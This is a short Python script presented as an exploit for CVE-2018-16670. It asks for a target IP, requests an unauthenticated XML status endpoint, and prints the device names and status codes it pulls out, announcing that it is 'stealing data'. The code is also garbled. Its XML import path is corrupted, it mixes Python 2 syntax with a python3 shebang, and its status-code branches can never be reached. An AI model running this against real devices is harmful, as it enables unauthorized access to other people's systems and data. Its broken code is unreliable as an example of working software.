#!/usr/bin/env python3
#evgind@gmail.com V0.1
#https://www.cvedetails.com/cve/CVE-2018-16670/

import requests
from termcolor import colored
import xml.efind.Elementfind as ET


devices = []
def get_status(): 
    print colored('[*] Performing check for CVE-2018-16670', 'blue')
    write_status = requests.get(target1 + '/services/user/values.xml?var=STATUS')
    write_raw = write_status.text
    find = ET.fromstring(write_raw)
    for i in range(0,len(find.findall(".//variable"))):
        for j in range(0,2):
            devices.append(find[i][j].text)
    print colored('[+] Stealing data from ' + str(len(devices)/2) + ' devices', 'green')
    return devices

def current_status(code): 
    code = int(code)
    if code == 1:
        print colored('[+] OK', 'green')
    elif code == 2:
        if code == 0x10:
            if code == 0x20:
                print colored('Time out.', 'red')
            elif code == 0x40:
                print colored('Bad device.', 'red')
            elif code == 0x80:
                print colored('Bad phase.', 'red')
            elif code == 0x100:
                print colored('Bad version.', 'red')
        else:
            print colored('Unknown  .', 'red')
    elif code == 4:
        print colored('not initialized.', 'red')
    else:
        print colored('Unknown code.', 'yellow')

url = raw_input('Enter Target IP Address: ')
target1 = 'http://' + url 

devices = get_status()
for i in range(0,len(devices)):
    if ((i % 2) != 0):
        result = devices[i].split('.')
        current_status(result[0])
    else:
        nombre = devices[i].replace('.STATUS', '')
        print colored('[+] Device name: ' + nombre, 'green')